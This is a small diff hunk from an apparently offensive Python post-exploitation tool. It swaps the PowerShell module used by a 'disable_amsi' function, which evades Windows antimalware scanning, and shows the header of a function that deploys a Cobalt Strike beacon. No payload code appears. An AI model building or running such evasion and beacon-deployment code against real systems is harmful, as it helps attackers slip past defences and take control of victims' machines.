@@ -153,7 +153,7 @@ def deploy_cobalt_beacon(session, beacon_path):
         print(colored("[-] Powershell beacon file not exist!"))
 
 def disable_amsi(session):
-	amsi_module = "modules/ASBBypass.ps1"
+	amsi_module = "modules/ILBypass.ps1"
 	if os.path.isfile(amsi_module):
 		fi = open(amsi_module, "r")
 		module_content = fi.read()
